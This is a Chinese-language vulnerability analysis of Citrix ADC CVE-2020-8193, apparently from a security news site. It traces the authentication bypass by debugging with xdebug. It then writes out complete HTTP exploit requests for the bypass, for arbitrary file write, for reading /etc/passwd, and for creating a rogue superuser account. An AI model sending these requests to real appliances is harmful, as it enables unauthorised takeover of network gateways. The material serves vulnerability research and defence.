# Citrix ADC CVE-2020-8193 利用PHP Xdebug无死角分析

阅读量 **298307**

|评论 **6**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-07-17 14:29:16

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t015465771b622dd440.jpg)

目前关于Citrix
ADC的动态调试分析文章很少，大部分为静态代码审计，难免会有一些生涩难懂的地方，有的认证绕过的原理还有分析错误，本文从搭建虚拟机和xdebug调试环境开始分析，动态调试跟踪漏洞的核心原理，以及分析其他绕过认证的方法。最后配合其他漏洞，实现任意文件读写。

## 0x01 Citrix ADC介绍

Citrix ADC 是一款应用交付 Controller，用于分析特定于应用的流量，以便智能地为 Web 应用程序分配、优化和保护 4 层 7
(L4—L7) 网络流量。

Citrix 官方发布了Citrix ADC，Citrix Gateway和Citrix SD-WAN WANOP
组件中多个安全漏洞风险通告。建议使用用户及时安装最新补丁，减少损失。

## 0x1 漏洞类型

![](https://p1.ssl.qhimg.com/t01fdd5852fcda2f394.png)

## 0x2 漏洞范围

  * Citrix ADC and Citrix Gateway: < 13.0-58.30
  * Citrix ADC and NetScaler Gateway: < 12.1-57.18
  * Citrix ADC and NetScaler Gateway: < 12.0-63.21
  * Citrix ADC and NetScaler Gateway: < 11.1-64.14
  * NetScaler ADC and NetScaler Gateway: < 10.5-70.18
  * Citrix SD-WAN WANOP: < 11.1.1a
  * Citrix SD-WAN WANOP: < 11.0.3d
  * Citrix SD-WAN WANOP: < 10.2.7
  * Citrix Gateway Plug-in for Linux: < 1.0.0.137

## 0x02 环境搭建

可参考 <https://mp.weixin.qq.com/s/cJMyTNumh_rsjwvj3kJIYA> 进行环境准备  
其中xdebug放在 <https://github.com/ctlyz123/CVE-2020-8193>

## 0x1 虚拟机安装

登录账号之后，在Citrix 官网选择appliances 下载  
<https://www.citrix.com/downloads/citrix-adc/virtual-appliances.html>

![](https://p3.ssl.qhimg.com/t015a67e3debad3b22f.jpg)

本文中所有环境均为Citrix ADC VPX for ESX 12.1 Build 55.18 虚拟机

## 0x2 搭建xdebug调试环境

该系列漏洞漏洞类型为php的逻辑类漏洞，考虑到Citrix
php代码量较为庞大，有想调试的打算，但是网上搜了一波并没有相关版本的`xdebug.so`，又因为当前环境下linux版本为不为常用的freebsd
8.4
版本，该版本已经停更更新源。最后折腾了一波把对应版本的xdebug编译完了，我也放在了github上供大家使用。下载下来之后放在/usr/local/lib/目录下和php.ini同级。

接下来就是php的常规调试步骤了：

###  1\. 修改php.ini

在/usr/local/lib/php.ini文件的最后添加如下配置

    
    
    [xdebug]
    zend_extension="/usr/local/lib/xdebug.so"
    xdebug.remote_autostart=1
    xdebug.remote_enable=1
    xdebug.remote_host = "192.168.1.118"
    xdebug.idekey="PHPSTORM"
    xdebug.remote_handler=dbgp
    xdebug.remote_port=9000
    

之前尝试了remote_connect_back最后不太好使，之后采用了remote_host的方式指定反连IP

###  2\. 配置phpstorm

开放Debug port，参考如下配置：

![](https://p4.ssl.qhimg.com/t01666117b8a8b5e14b.png)

###  3\. 效果

在主目录/netscaler/ns_gui写phpinfo并查看效果如下：

![](https://p1.ssl.qhimg.com/t01ee2d4f6d26e5954e.jpg)

成功配置调试模式

## 0x03 Citrix 路由分析

###  0x1 http 流量转发

查看httpd.conf 配置文件，这段配置的主要功能是将login menu等路由赚到。

![](https://p2.ssl.qhimg.com/t010b30a90b7cd4eca6.jpg)

###  0x2 设置路由

`/admin_ui/php/index.php`

![](https://p5.ssl.qhimg.com/t01f7195f9e6634e54f.jpg)

`/admin_ui/php/system/core/CodeIgniter.php`

![](https://p4.ssl.qhimg.com/t019dd693ed91f7d39a.jpg)

`/admin_ui/php/system/core/Router.php`在进入路由前的预处理操作，将会在_parse_routes中处理对应的路由。

![](https://p4.ssl.qhimg.com/t01a59738cf5e61a805.jpg)

`/admin_ui/php/system/core/Router.php`按照规则匹配路由表

![](https://p4.ssl.qhimg.com/t0184541febe7c459d6.jpg)

将URL参数划分为类/方法/参数，如下图所示：

![](https://p3.ssl.qhimg.com/t01004fa1640dfea70c.jpg)

###  0x3 加载对应路由代码

再回到CodeIgniter.php中引用类，调用include方法实现此功能。

![](https://p4.ssl.qhimg.com/t01ba4997ae835a07f2.jpg)

## 0x04 Citrix 漏洞分析

本次Citrix最重要的漏洞为认证绕过，在此基础上有任意文件操作和低权限获取漏洞。

###  0x1 认证绕过

**1 Session赋值及合法性检测**

梳理过路由之后找到一个不用经过认证，而且可以创建有效session 的路径 。在pcidss.php
中的report方法里面存在调用init的代码分支，如下图所示

![](https://p3.ssl.qhimg.com/t01150044557dac5713.png)

回头看一下init代码里的流程可以发现其中包含创建session的过程，这里的`$argsList['sid']`
为get参数中的sid，该参数被带入到setup_webstart_session 函数中复制给session的sid

![](https://p1.ssl.qhimg.com/t01d68a2fccc74c7e60.png)

setup_webstart_session函数如下，经过简单的合法性检查SESSION的主要字段就被赋值了

![](https://p0.ssl.qhimg.com/t010f359e0ac25b8a68.png)

检查规则如下，简单的数字和字母正则匹配

![](https://p3.ssl.qhimg.com/t01c20d1afed43338dc.png)

**2 后续流程分析**

上一步骤中分析了session的赋值，但是在赋值之后还有很多操作，如果其中某一步操作失败，Cookie id
是不会被返回到前端来的。因此还需要梳理后续的程序流程，继续调试分析

![](https://p1.ssl.qhimg.com/t01bb7d68ed9edb9d06.png)

利用fetchEntity函数解析post数据中的内容，跟进查看

![](https://p0.ssl.qhimg.com/t0145e0d3f2b1514ac7.png)

![](https://p5.ssl.qhimg.com/t01746d77c614db2ee2.png)

这里command是从$entity变量生成的，可以看出entitydef中的变量对应关系。下一步就是执行execte_command
函数。该函数在abstract_controller.php 文件中，利用get_nitro_mode函数动态的获取了nitro_model.php
函数中的类并直接执行了该类中的execute_command方法

![](https://p3.ssl.qhimg.com/t01678cf475afb29a93.png)

继续跟进，顺利的来到了nitro_model.php 中的command_execution方法

![](https://p5.ssl.qhimg.com/t01982b105ca510ba5b.png)

最重要的地方来了在下面会分析，如何构造数据包绕过认证。

**3 绕过认证**

经过多次调试发现了个比较特殊的现象，如果走了如下分支就会覆盖$query_params
变量，那么该分支的赋值会让$nitro_return_value得到一个xml的返回内容如下所示

![](https://p0.ssl.qhimg.com/t01667bf349bcf48ee8.jpg)

    
    
    <?xml version="1.0"?>
    <nitroResponse><errorcode>354</errorcode><message>Invalid username or password</message><severity>ERROR</severity></nitroResponse>
    

那么问题来了，如果正常的认证失败是有一个json的返回体，json格式就会正常解析代码如下：

![](https://p3.ssl.qhimg.com/t01ae47859279d34435.png)

根据代码逻辑如果$nitro_return_value为xml格式那么将会解析失败，从而使得$this->result的内容为null，这就造成了下面逻辑走了另一个分支。这就是绕过认证的核心原理，只需要将
$this->result
赋值为null之后就可以认证绕过了。只需将sid设置为包含loginchallengeresponse且包含requestbody即可。

**4 返回xml原因**

之后又跟踪了函数 `$nitro->v1($arg_list[0], $arg_list[1] .
$query_params);`发现在nsrest_exec 中会有错误的返回，如果参数如下图所示则会返回xml格式导致，认证解析失败，从而绕过认证。

![](https://p4.ssl.qhimg.com/t01a485fc4a93db43c1.png)

**5 session修复**

经过一波操作，得到的session还有很多属性没有设置如下图所示，NSAPI为之前的loginchalleresponse：

![](https://p3.ssl.qhimg.com/t01c380e83fc6b4c696.png)

如果设置了force_setup 为1则会给session赋值，如下图所示：

![](https://p1.ssl.qhimg.com/t01d88bb7327d282d5a.png)

最后的session各个要素都具备，具有了使用价值，达到了认证绕过的目的。

![](https://p1.ssl.qhimg.com/t019b57486608cc35a7.png)

**6 其他绕过方式**

通过上面的一波分析，对认证绕过的方式有了一些的了解，我们看一看有没有其他的分支可以绕过。首先梳理下绕过的条件

  * 代码在最后需要进入类似于$this->fetchEntity(‘appfwprofile’)的函数
  * 需要设置get参数sid包含loginchallengeresponse且包含requestbody

最后一个条件好满足，那么看一看第一个条件还有没有其他的分支，经过梳理之后发现了以下每个分支都可以达到绕过认证

![](https://p5.ssl.qhimg.com/t0119e1a2c02aeb40a9.png)

![](https://p4.ssl.qhimg.com/t01036087f1dd6c7092.png)

但是里面有坑其中fwconfig需要修改以下payload

    
    
    POST /pcidss/report?type=fwconfig&sid=loginchallengeresponserequestbody&username=nsroot&set=1 HTTP/1.1
    Host: 192.168.1.131
    User-Agent: python-requests/2.24.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Type: application/xml
    X-NITRO-USER: Twjf2fOW
    X-NITRO-PASS: Du16oQQ0
    Content-Length: 42
    
    <appfwpolicy><login></login></appfwpolicy>
    

###  0x2 获取随机数

根据原作者的描述以及自己的调试，session的使用需要设置rand_key

![](https://p0.ssl.qhimg.com/t01bb35ef44a34b6868.jpg)

在代码中也有对session和rand_key的校验

![](https://p5.ssl.qhimg.com/t014f0d5f4b336ac466.png)

此时如果不一致将会404就像代码的逻辑一样。但是这个也是很好获取的，访问带有header的php就可以获取到

![](https://p0.ssl.qhimg.com/t01884241f17b206f87.png)

作者给的是

    
    
    GET /menu/stc HTTP/1.1
    Host: citrix.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Cookie: SESSID=05afba59ef8e0e35933f3bc266941337
    Upgrade-Insecure-Requests: 1
    

就这样带着session和rand_key 就可以干一些事情了

###  0x3 任意文件写

在rapi.php的main 函数中存在一个大switch case，其中有很多关键函数

![](https://p2.ssl.qhimg.com/t0181ba14ee457d725f.png)

prepare_text_upload 函数中存在文件写操作

![](https://p3.ssl.qhimg.com/t01decff5c7d1262c91.png)

发送如下数据包 注意修改session和rand_key

    
    
    POST /rapi/uploadtext HTTP/1.1
    Host: citrix.local
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://citrix.local/menu/neo
    DNT: 1
    rand_key: 1179557566.1594810901289502
    Connection: close
    Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; SESSID=6c8e255a118516ff2cb50fa2ee6cbda1; rdx_pagination_size=25%20Per%20Page
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 80
    
    object={"uploadtext":{"filedir":"/tmp","filedata":"test","filename":"test.txt"}}
    

这里的文件目录主要是根据filename生成，会先删除该文件然后再创建，该部分逻辑如下图所示。

![](https://p2.ssl.qhimg.com/t01b75a3719374791ae.png)

写入效果如下

![](https://p3.ssl.qhimg.com/t01ca456d9e78a89392.png)

###  0x4 任意文件读

在同一个函数有一个 filedownload函数，该功能可以实现文件下载

![](https://p5.ssl.qhimg.com/t019c41a7bbca4759f0.png)

指定path参数 此用url编码 `path:%2fetc%2fpasswd`

![](https://p4.ssl.qhimg.com/t016edbaa92f00e3ea4.png)

    
    
    POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
    Host: 192.168.1.131
    User-Agent: python-requests/2.24.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Type: application/xml
    X-NITRO-USER: onu1IQgD
    X-NITRO-PASS: FGsE6MyM
    rand_key: 1637785190.1594812669375542
    Cookie: SESSID=275cd8c53c9a1b710e051079183e3427; is_cisco_platform=0; startupapp=neo
    Content-Length: 31
    
    <clipermission></clipermission>
    

###  0x5 获取系统权限

可以采用多种方法获取系统权限

  * 上传ssh 公钥，直接连接
  * 修改用户名密码，直接登录
  * 创建新用户，登录获取shell

这里把创建新用户的数据包贴出来

第一个包创建用户

    
    
    POST /nitro/v1/config/systemuser HTTP/1.1
    Host: 192.168.3.18:9080
    Content-Length: 83
    Cache-Control: max-age=0
    Accept: application/json
    rand_key: 845810655.1594556994263502
    NITRO_WEB_APPLICATION: true
    If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    DNT: 1
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo
    Connection: close
    
    object={"params":{"warning":"YES"},"systemuser":{"username":"nsroot1","password":"nsroot1","timeout":"900","maxsession":"20","logging":"ENABLED","externalauth":"ENABLED"}}
    

第二个包修改为superuser权限

    
    
    POST /nitro/v1/config/systemuser_systemcmdpolicy_binding HTTP/1.1
    Host: 192.168.3.18:9080
    Content-Length: 83
    Cache-Control: max-age=0
    Accept: application/json
    rand_key: 845810655.1594556994263502
    NITRO_WEB_APPLICATION: true
    If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    DNT: 1
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
    Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo
    Connection: close
    
    object={"params":{"warning":"YES"},"systemuser_systemcmdpolicy_binding":{"policyname":"superuser","priority":"0","username":"nsroot1"}}
    

## 0x05 参考链接

<https://dmaasland.github.io/posts/citrix.html>  
<https://github.com/Airboi/Citrix-ADC-RCE-CVE-2020-8193>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/210920](/post/id/210920)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [RCE](/tag/RCE)
  * [Citrix](/tag/Citrix)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

